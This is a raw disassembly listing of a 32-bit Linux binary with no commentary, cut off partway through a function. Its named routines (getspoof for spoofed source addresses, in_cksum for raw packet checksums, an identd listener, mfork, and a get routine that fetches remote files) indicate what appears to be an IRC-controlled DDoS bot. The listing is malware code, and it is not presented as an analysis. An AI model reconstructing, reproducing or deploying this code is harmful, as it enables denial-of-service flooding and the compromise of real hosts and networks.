push   ebp
mov    ebp,esp
sub    esp,0x8
call   8048c64 <call_gmon_start>
call   8048cf0 <frame_dummy>
call   804c700 <__do_global_ctors_aux>
leave  
ret    
push   DWORD PTR ds:0x804e2c0
jmp    DWORD PTR ds:0x804e2c4
add    BYTE PTR [eax],al
jmp    DWORD PTR ds:0x804e2c8
push   0x0
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e2cc
push   0x8
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e2d0
push   0x10
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e2d4
push   0x18
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e2d8
push   0x20
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e2dc
push   0x28
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e2e0
push   0x30
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e2e4
push   0x38
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e2e8
push   0x40
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e2ec
push   0x48
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e2f0
push   0x50
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e2f4
push   0x58
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e2f8
push   0x60
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e2fc
push   0x68
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e300
push   0x70
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e304
push   0x78
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e308
push   0x80
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e30c
push   0x88
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e310
push   0x90
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e314
push   0x98
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e318
push   0xa0
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e31c
push   0xa8
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e320
push   0xb0
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e324
push   0xb8
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e328
push   0xc0
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e32c
push   0xc8
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e330
push   0xd0
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e334
push   0xd8
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e338
push   0xe0
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e33c
push   0xe8
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e340
push   0xf0
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e344
push   0xf8
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e348
push   0x100
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e34c
push   0x108
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e350
push   0x110
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e354
push   0x118
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e358
push   0x120
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e35c
push   0x128
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e360
push   0x130
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e364
push   0x138
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e368
push   0x140
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e36c
push   0x148
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e370
push   0x150
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e374
push   0x158
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e378
push   0x160
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e37c
push   0x168
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e380
push   0x170
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e384
push   0x178
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e388
push   0x180
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e38c
push   0x188
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e390
push   0x190
jmp    80488e8 <.plt>
jmp    DWORD PTR ds:0x804e394
push   0x198
jmp    80488e8 <.plt>
xor    ebp,ebp
pop    esi
mov    ecx,esp
and    esp,0xfffffff0
push   eax
push   esp
push   edx
push   0x804c680
push   0x804c690
push   ecx
push   esi
push   0x804c10d
call   8048a18 <__libc_start_main@plt>
hlt    
nop
nop
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x4
call   8048c70 <call_gmon_start+0xc>
pop    ebx
add    ebx,0x564c
mov    edx,DWORD PTR [ebx-0x4]
test   edx,edx
je     8048c86 <call_gmon_start+0x22>
call   8048958 <__gmon_start__@plt>
pop    eax
pop    ebx
leave  
ret    
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x4
cmp    BYTE PTR ds:0x804e4c4,0x0
jne    8048cdf <__do_global_dtors_aux+0x4f>
mov    eax,0x804e1e8
sub    eax,0x804e1e4
sar    eax,0x2
lea    ebx,[eax-0x1]
mov    eax,ds:0x804e4c0
cmp    ebx,eax
jbe    8048cd8 <__do_global_dtors_aux+0x48>
lea    esi,[esi+eiz*1+0x0]
add    eax,0x1
mov    ds:0x804e4c0,eax
call   DWORD PTR [eax*4+0x804e1e4]
mov    eax,ds:0x804e4c0
cmp    ebx,eax
ja     8048cc0 <__do_global_dtors_aux+0x30>
mov    BYTE PTR ds:0x804e4c4,0x1
add    esp,0x4
pop    ebx
pop    ebp
ret    
lea    esi,[esi+eiz*1+0x0]
lea    edi,[edi+eiz*1+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    eax,ds:0x804e1ec
test   eax,eax
je     8048d11 <frame_dummy+0x21>
mov    eax,0x0
test   eax,eax
je     8048d11 <frame_dummy+0x21>
mov    DWORD PTR [esp],0x804e1ec
call   eax
leave  
ret    
nop
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x24
mov    eax,DWORD PTR [ebp+0x8]
movzx  eax,BYTE PTR [eax]
movsx  eax,al
mov    DWORD PTR [ebp-0x18],eax
cmp    DWORD PTR [ebp-0x18],0x2a
je     8048d4f <strwildmatch+0x3b>
cmp    DWORD PTR [ebp-0x18],0x3f
je     8048da6 <strwildmatch+0x92>
cmp    DWORD PTR [ebp-0x18],0x0
je     8048d3e <strwildmatch+0x2a>
jmp    8048de4 <strwildmatch+0xd0>
mov    eax,DWORD PTR [ebp+0xc]
movzx  eax,BYTE PTR [eax]
movsx  eax,al
mov    DWORD PTR [ebp-0x14],eax
jmp    8048e3e <strwildmatch+0x12a>
mov    eax,DWORD PTR [ebp+0x8]
add    eax,0x1
mov    edx,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x4],edx
mov    DWORD PTR [esp],eax
call   8048d14 <strwildmatch>
test   eax,eax
je     8048d94 <strwildmatch+0x80>
mov    eax,DWORD PTR [ebp+0xc]
movzx  eax,BYTE PTR [eax]
test   al,al
je     8048d8b <strwildmatch+0x77>
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x1
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048d14 <strwildmatch>
test   eax,eax
je     8048d94 <strwildmatch+0x80>
mov    DWORD PTR [ebp-0x10],0x1
jmp    8048d9b <strwildmatch+0x87>
mov    DWORD PTR [ebp-0x10],0x0
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [ebp-0x14],eax
jmp    8048e3e <strwildmatch+0x12a>
mov    eax,DWORD PTR [ebp+0xc]
movzx  eax,BYTE PTR [eax]
test   al,al
je     8048dcc <strwildmatch+0xb8>
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x1
mov    edx,DWORD PTR [ebp+0x8]
add    edx,0x1
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   8048d14 <strwildmatch>
test   eax,eax
je     8048dd5 <strwildmatch+0xc1>
mov    DWORD PTR [ebp-0xc],0x1
jmp    8048ddc <strwildmatch+0xc8>
mov    DWORD PTR [ebp-0xc],0x0
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [ebp-0x14],eax
jmp    8048e3e <strwildmatch+0x12a>
mov    eax,DWORD PTR [ebp+0x8]
movzx  eax,BYTE PTR [eax]
movsx  eax,al
mov    DWORD PTR [esp],eax
call   80489e8 <toupper@plt>
mov    ebx,eax
mov    eax,DWORD PTR [ebp+0xc]
movzx  eax,BYTE PTR [eax]
movsx  eax,al
mov    DWORD PTR [esp],eax
call   80489e8 <toupper@plt>
cmp    ebx,eax
jne    8048e28 <strwildmatch+0x114>
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x1
mov    edx,DWORD PTR [ebp+0x8]
add    edx,0x1
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   8048d14 <strwildmatch>
test   eax,eax
je     8048e31 <strwildmatch+0x11d>
mov    DWORD PTR [ebp-0x8],0x1
jmp    8048e38 <strwildmatch+0x124>
mov    DWORD PTR [ebp-0x8],0x0
mov    eax,DWORD PTR [ebp-0x8]
mov    DWORD PTR [ebp-0x14],eax
mov    eax,DWORD PTR [ebp-0x14]
add    esp,0x24
pop    ebx
pop    ebp
ret    
push   ebp
mov    ebp,esp
push   edi
sub    esp,0x24
lea    eax,[ebp+0x10]
mov    DWORD PTR [ebp-0x8],eax
mov    eax,DWORD PTR [ebp-0x8]
mov    DWORD PTR [esp+0x8],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],0x804e500
call   8048968 <vsprintf@plt>
mov    eax,0x804e500
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x18],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x18]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804e500
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   80489b8 <write@plt>
add    esp,0x24
pop    edi
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0x28
movzx  eax,BYTE PTR ds:0x804e4e4
cmp    al,0x1
jne    8048ee4 <mfork+0x3a>
mov    edx,DWORD PTR ds:0x804e920
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804c78b
mov    DWORD PTR [esp],edx
call   8048e47 <Send>
mov    DWORD PTR [ebp-0x14],0x1
jmp    8048f89 <mfork+0xdf>
call   8048bb8 <fork@plt>
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0x0
jne    8048efd <mfork+0x53>
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [ebp-0x14],eax
jmp    8048f89 <mfork+0xdf>
mov    eax,ds:0x804e4f0
add    eax,0x1
mov    ds:0x804e4f0,eax
mov    eax,ds:0x804e4f0
shl    eax,0x2
add    eax,0x4
mov    DWORD PTR [esp],eax
call   8048b78 <malloc@plt>
mov    DWORD PTR [ebp-0x8],eax
mov    DWORD PTR [ebp-0x4],0x0
jmp    8048f4c <mfork+0xa2>
mov    eax,DWORD PTR [ebp-0x4]
shl    eax,0x2
mov    ecx,eax
add    ecx,DWORD PTR [ebp-0x8]
mov    eax,DWORD PTR [ebp-0x4]
shl    eax,0x2
mov    edx,eax
mov    eax,ds:0x804e928
lea    eax,[edx+eax*1]
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [ecx],eax
add    DWORD PTR [ebp-0x4],0x1
mov    eax,ds:0x804e4f0
sub    eax,0x1
cmp    eax,DWORD PTR [ebp-0x4]
ja     8048f29 <mfork+0x7f>
mov    edx,DWORD PTR [ebp-0x8]
sub    edx,0x4
mov    eax,ds:0x804e4f0
shl    eax,0x2
add    edx,eax
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [edx],eax
mov    eax,ds:0x804e928
mov    DWORD PTR [esp],eax
call   8048a48 <free@plt>
mov    eax,DWORD PTR [ebp-0x8]
mov    ds:0x804e928,eax
mov    eax,DWORD PTR [ebp-0xc]
mov    DWORD PTR [ebp-0x14],eax
mov    eax,DWORD PTR [ebp-0x14]
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x18
mov    eax,ds:0x804e4e8
test   eax,eax
jne    8048fa7 <getspoof+0x19>
call   8048bd8 <rand@plt>
mov    DWORD PTR [ebp-0x4],eax
jmp    8048ff2 <getspoof+0x64>
mov    eax,ds:0x804e4ec
cmp    eax,0x1
jne    8048fc3 <getspoof+0x35>
mov    eax,ds:0x804e4e8
mov    DWORD PTR [esp],eax
call   8048a28 <ntohl@plt>
mov    DWORD PTR [ebp-0x4],eax
jmp    8048ff2 <getspoof+0x64>
call   8048bd8 <rand@plt>
mov    edx,eax
mov    eax,ds:0x804e4ec
mov    DWORD PTR [ebp-0x8],eax
mov    eax,edx
mov    edx,0x0
div    DWORD PTR [ebp-0x8]
mov    eax,ds:0x804e4e8
lea    eax,[edx+eax*1]
add    eax,0x1
mov    DWORD PTR [esp],eax
call   8048a28 <ntohl@plt>
mov    DWORD PTR [ebp-0x4],eax
mov    eax,DWORD PTR [ebp-0x4]
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
sub    esp,0xc
jmp    8049029 <filter+0x32>
mov    edx,DWORD PTR [ebp+0x8]
sub    edx,0x1
mov    eax,DWORD PTR [ebp+0x8]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x8],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x8]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
lea    eax,[edx+eax*1]
mov    BYTE PTR [eax],0x0
mov    edx,DWORD PTR [ebp+0x8]
sub    edx,0x1
mov    eax,DWORD PTR [ebp+0x8]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0xc],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0xc]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
lea    eax,[edx+eax*1]
movzx  eax,BYTE PTR [eax]
cmp    al,0xd
je     8049000 <filter+0x9>
mov    edx,DWORD PTR [ebp+0x8]
sub    edx,0x1
mov    eax,DWORD PTR [ebp+0x8]
mov    ecx,0xffffffff
mov    DWORD PTR [ebp-0x10],eax
mov    eax,0x0
cld    
mov    edi,DWORD PTR [ebp-0x10]
repnz scas al,BYTE PTR es:[edi]
mov    eax,ecx
not    eax
sub    eax,0x1
lea    eax,[edx+eax*1]
movzx  eax,BYTE PTR [eax]
cmp    al,0xa
je     8049000 <filter+0x9>
add    esp,0xc
pop    edi
pop    ebp
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
sub    esp,0x43c
call   8048bd8 <rand@plt>
mov    ecx,eax
mov    DWORD PTR [ebp-0x43c],0x66666667
mov    eax,DWORD PTR [ebp-0x43c]
imul   ecx
sar    edx,1
mov    eax,ecx
sar    eax,0x1f
mov    ebx,edx
sub    ebx,eax
mov    DWORD PTR [ebp-0x438],ebx
mov    eax,DWORD PTR [ebp-0x438]
shl    eax,0x2
add    eax,DWORD PTR [ebp-0x438]
mov    esi,ecx
sub    esi,eax
mov    DWORD PTR [ebp-0x438],esi
mov    eax,DWORD PTR [ebp-0x438]
add    eax,0x4
mov    DWORD PTR [ebp-0x1c],eax
mov    eax,DWORD PTR [ebp-0x1c]
add    eax,0x1
mov    DWORD PTR [esp],eax
call   8048b78 <malloc@plt>
mov    DWORD PTR [ebp-0x20],eax
mov    eax,DWORD PTR [ebp-0x1c]
add    eax,0x1
mov    edx,eax
mov    eax,DWORD PTR [ebp-0x20]
mov    edi,eax
cld    
mov    ecx,edx
mov    eax,0x0
rep stos BYTE PTR es:[edi],al
mov    DWORD PTR [esp+0x4],0x804c7a9
mov    DWORD PTR [esp],0x804c7ab
call   8048ab8 <fopen@plt>
mov    DWORD PTR [ebp-0x14],eax
cmp    DWORD PTR [ebp-0x14],0x0
jne    8049197 <makestring+0x10a>
mov    DWORD PTR [ebp-0x18],0x0
jmp    804918a <makestring+0xfd>
mov    eax,DWORD PTR [ebp-0x18]
mov    ebx,eax
add    ebx,DWORD PTR [ebp-0x20]
call   8048bd8 <rand@plt>
mov    ecx,eax
mov    DWORD PTR [ebp-0x43c],0x4ec4ec4f
mov    eax,DWORD PTR [ebp-0x43c]
imul   ecx
sar    edx,0x3
mov    eax,ecx
sar    eax,0x1f
mov    esi,edx
sub    esi,eax
mov    DWORD PTR [ebp-0x434],esi
imul   eax,DWORD PTR [ebp-0x434],0x1a
mov    edx,ecx
sub    edx,eax
mov    DWORD PTR [ebp-0x434],edx
movzx  eax,BYTE PTR [ebp-0x434]
add    eax,0x41
mov    BYTE PTR [ebx],al
add    DWORD PTR [ebp-0x18],0x1
mov    eax,DWORD PTR [ebp-0x18]
cmp    eax,DWORD PTR [ebp-0x1c]
jl     8049136 <makestring+0xa9>
jmp    804928d <makestring+0x200>
call   8048bd8 <rand@plt>
mov    ebx,eax
call   8048bd8 <rand@plt>
mov    ecx,ebx
imul   ecx,eax
mov    DWORD PTR [ebp-0x43c],0xb8c3517b
mov    eax,DWORD PTR [ebp-0x43c]
imul   ecx
lea    eax,[edx+ecx*1]
mov    edx,eax
sar    edx,0xf
mov    eax,ecx
sar    eax,0x1f
mov    ebx,edx
sub    ebx,eax
mov    DWORD PTR [ebp-0x430],ebx
imul   eax,DWORD PTR [ebp-0x430],0xb15a
mov    esi,ecx
sub    esi,eax
mov    DWORD PTR [ebp-0x430],esi
mov    eax,DWORD PTR [ebp-0x430]
add    eax,0x1
mov    DWORD PTR [ebp-0x10],eax
mov    DWORD PTR [ebp-0x18],0x0
jmp    804921b <makestring+0x18e>
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x400
lea    eax,[ebp-0x420]
mov    DWORD PTR [esp],eax
call   80489f8 <fgets@plt>
add    DWORD PTR [ebp-0x18],0x1
mov    eax,DWORD PTR [ebp-0x18]
cmp    eax,DWORD PTR [ebp-0x10]
jl     80491fa <makestring+0x16d>
lea    eax,[ebp-0x420]
mov    edx,eax
mov    eax,0x400
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x0
mov    DWORD PTR [esp],edx
call   8048a08 <memset@plt>
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x400
lea    eax,[ebp-0x420]
mov    DWORD PTR [esp],eax
call   80489f8 <fgets@plt>
lea    eax,[ebp-0x420]
mov    DWORD PTR [esp],eax
call   8048ff7 <filter>
mov    ecx,DWORD PTR [ebp-0x1c]
mov    eax,DWORD PTR [ebp-0x20]
lea    edx,[ebp-0x420]
mov    edi,eax
mov    esi,edx
cld    
rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp],eax
call   8048a88 <fclose@plt>
mov    eax,DWORD PTR [ebp-0x20]
add    esp,0x43c
pop    ebx
pop    esi
pop    edi
pop    ebp
ret    
push   ebp
mov    ebp,esp
push   edi
sub    esp,0x4e4
mov    DWORD PTR [esp+0x8],0x0
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x2
call   8048a78 <socket@plt>
mov    DWORD PTR [ebp-0x18],eax
cmp    DWORD PTR [ebp-0x18],0xffffffff
je     804951f <identd+0x284>
mov    WORD PTR [ebp-0x30],0x2
mov    DWORD PTR [esp],0x71
call   8048a38 <htons@plt>
mov    WORD PTR [ebp-0x2e],ax
mov    DWORD PTR [ebp-0x2c],0x0
lea    eax,[ebp-0x30]
add    eax,0x8
mov    DWORD PTR [eax],0x0
mov    DWORD PTR [eax+0x4],0x0
lea    eax,[ebp-0x30]
mov    DWORD PTR [esp+0x8],0x10
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   8048b08 <bind@plt>
cmp    eax,0xffffffff
je     804951f <identd+0x284>
mov    DWORD PTR [esp+0x4],0x1
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   80489d8 <listen@plt>
cmp    eax,0xffffffff
je     804951f <identd+0x284>
call   8048bb8 <fork@plt>
test   eax,eax
je     804951f <identd+0x284>
mov    DWORD PTR [ebp-0x20],0x10
lea    eax,[ebp-0x20]
lea    edx,[ebp-0x40]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],edx
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   8048a58 <accept@plt>
mov    DWORD PTR [ebp-0x14],eax
cmp    DWORD PTR [ebp-0x14],0xffffffff
jne    804937f <identd+0xe4>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    eax,0x0
mov    ecx,0x20
lea    edi,[ebp-0x4c8]
cld    
rep stos DWORD PTR es:[edi],eax
mov    DWORD PTR [ebp-0xc],ecx
mov    DWORD PTR [ebp-0x8],edi
mov    eax,DWORD PTR [ebp-0x14]
mov    edx,eax
shr    edx,0x5
mov    eax,DWORD PTR [ebp-0x14]
and    eax,0x1f
bts    DWORD PTR [ebp+edx*4-0x4c8],eax
mov    DWORD PTR [ebp-0x444],0x3c
mov    eax,DWORD PTR [ebp-0x444]
mov    DWORD PTR [ebp-0x448],eax
mov    edx,DWORD PTR [ebp-0x14]
add    edx,0x1
lea    eax,[ebp-0x448]
mov    DWORD PTR [esp+0x10],eax
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0x0
lea    eax,[ebp-0x4c8]
mov    DWORD PTR [esp+0x4],eax
mov    DWORD PTR [esp],edx
call   8048b48 <select@plt>
test   eax,eax
jns    8049406 <identd+0x16b>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    eax,DWORD PTR [ebp-0x14]
mov    edx,eax
and    edx,0x1f
mov    eax,DWORD PTR [ebp-0x14]
shr    eax,0x5
bt     DWORD PTR [ebp+eax*4-0x4c8],edx
setb   al
test   al,al
jne    8049428 <identd+0x18d>
jmp    804937f <identd+0xe4>
mov    DWORD PTR [esp+0xc],0x0
mov    DWORD PTR [esp+0x8],0x400
lea    eax,[ebp-0x440]
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp],eax
call   8048988 <recv@plt>
mov    DWORD PTR [ebp-0x10],eax
cmp    DWORD PTR [ebp-0x10],0x0
jle    804945c <identd+0x1c1>
cmp    DWORD PTR [ebp-0x10],0x13
jle    8049468 <identd+0x1cd>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    eax,DWORD PTR [ebp-0x10]
mov    BYTE PTR [ebp+eax*1-0x440],0x0
mov    eax,DWORD PTR [ebp-0x10]
sub    eax,0x1
movzx  eax,BYTE PTR [ebp+eax*1-0x440]
cmp    al,0xa
je     8049497 <identd+0x1fc>
mov    eax,DWORD PTR [ebp-0x10]
sub    eax,0x1
movzx  eax,BYTE PTR [ebp+eax*1-0x440]
cmp    al,0xd
jne    80494a5 <identd+0x20a>
mov    eax,DWORD PTR [ebp-0x10]
sub    eax,0x1
mov    BYTE PTR [ebp+eax*1-0x440],0x0
mov    eax,DWORD PTR [ebp-0x10]
sub    eax,0x2
movzx  eax,BYTE PTR [ebp+eax*1-0x440]
cmp    al,0xa
je     80494c9 <identd+0x22e>
mov    eax,DWORD PTR [ebp-0x10]
sub    eax,0x2
movzx  eax,BYTE PTR [ebp+eax*1-0x440]
cmp    al,0xd
jne    80494d7 <identd+0x23c>
mov    eax,DWORD PTR [ebp-0x10]
sub    eax,0x2
mov    BYTE PTR [ebp+eax*1-0x440],0x0
mov    eax,ds:0x804e92c
mov    DWORD PTR [esp+0xc],eax
lea    eax,[ebp-0x440]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804c7bb
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [esp],eax
call   8048b58 <close@plt>
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [esp],eax
call   8048b58 <close@plt>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
add    esp,0x4e4
pop    edi
pop    ebp
ret    
push   ebp
mov    ebp,esp
sub    esp,0xc
cmp    DWORD PTR [ebp+0xc],0x0
jne    804953d <pow+0x15>
mov    DWORD PTR [ebp-0x4],0x1
jmp    8049569 <pow+0x41>
cmp    DWORD PTR [ebp+0xc],0x1
jne    804954b <pow+0x23>
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [ebp-0x4],eax
jmp    8049569 <pow+0x41>
mov    eax,DWORD PTR [ebp+0xc]
sub    eax,0x1
mov    DWORD PTR [esp+0x4],eax
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8049528 <pow>
mov    edx,eax
imul   edx,DWORD PTR [ebp+0x8]
mov    DWORD PTR [ebp-0x4],edx
mov    eax,DWORD PTR [ebp-0x4]
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x1c
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [ebp-0x1c],eax
mov    edx,DWORD PTR [ebp+0x8]
mov    DWORD PTR [ebp-0x18],edx
mov    DWORD PTR [ebp-0x14],0x0
mov    WORD PTR [ebp-0x2],0x0
jmp    80495a3 <in_cksum+0x35>
mov    edx,DWORD PTR [ebp-0x18]
movzx  eax,WORD PTR [edx]
movzx  eax,ax
add    DWORD PTR [ebp-0x14],eax
add    DWORD PTR [ebp-0x18],0x2
sub    DWORD PTR [ebp-0x1c],0x2
cmp    DWORD PTR [ebp-0x1c],0x1
jg     804958f <in_cksum+0x21>
cmp    DWORD PTR [ebp-0x1c],0x1
jne    80495c4 <in_cksum+0x56>
lea    edx,[ebp-0x2]
mov    eax,DWORD PTR [ebp-0x18]
movzx  eax,BYTE PTR [eax]
mov    BYTE PTR [edx],al
movzx  eax,WORD PTR [ebp-0x2]
movzx  eax,ax
add    DWORD PTR [ebp-0x14],eax
mov    edx,DWORD PTR [ebp-0x14]
sar    edx,0x10
movzx  eax,WORD PTR [ebp-0x14]
add    edx,eax
mov    DWORD PTR [ebp-0x14],edx
mov    eax,DWORD PTR [ebp-0x14]
sar    eax,0x10
add    DWORD PTR [ebp-0x14],eax
movzx  eax,WORD PTR [ebp-0x14]
not    eax
mov    WORD PTR [ebp-0x2],ax
movzx  eax,WORD PTR [ebp-0x2]
movzx  eax,ax
leave  
ret    
push   ebp
mov    ebp,esp
push   edi
push   esi
sub    esp,0x1470
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp],eax
call   8048eaa <mfork>
test   eax,eax
jne    8049a4c <get+0x45d>
cmp    DWORD PTR [ebp+0x10],0x1
jg     8049639 <get+0x4a>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804c7d4
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    DWORD PTR [esp+0x8],0x0
mov    DWORD PTR [esp+0x4],0x1
mov    DWORD PTR [esp],0x2
call   8048a78 <socket@plt>
mov    DWORD PTR [ebp-0x2c],eax
cmp    DWORD PTR [ebp-0x2c],0xffffffff
jne    8049684 <get+0x95>
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [esp+0x8],eax
mov    DWORD PTR [esp+0x4],0x804c7f8
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [esp],eax
call   8048e47 <Send>
mov    DWORD PTR [esp],0x0
call   8048c18 <exit@plt>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [ebp-0x144c],eax
mov    DWORD PTR [ebp-0x1450],0x804c81d
mov    DWORD PTR [ebp-0x1454],0x7
cld    
mov    esi,DWORD PTR [ebp-0x144c]
mov    edi,DWORD PTR [ebp-0x1450]
mov    ecx,DWORD PTR [ebp-0x1454]
repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
seta   dl
setb   al
mov    ecx,edx
sub    cl,al
mov    eax,ecx
movsx  eax,al
test   eax,eax
jne    80496ed <get+0xfe>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
add    eax,0x7
mov    DWORD PTR [esp+0x4],eax
lea    eax,[ebp-0x43c]
mov    DWORD PTR [esp],eax
call   8048af8 <strcpy@plt>
jmp    8049707 <get+0x118>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x4
mov    eax,DWORD PTR [eax]
mov    DWORD PTR [esp+0x4],eax
lea    eax,[ebp-0x43c]
mov    DWORD PTR [esp],eax
call   8048af8 <strcpy@plt>
mov    DWORD PTR [ebp-0x28],0x0
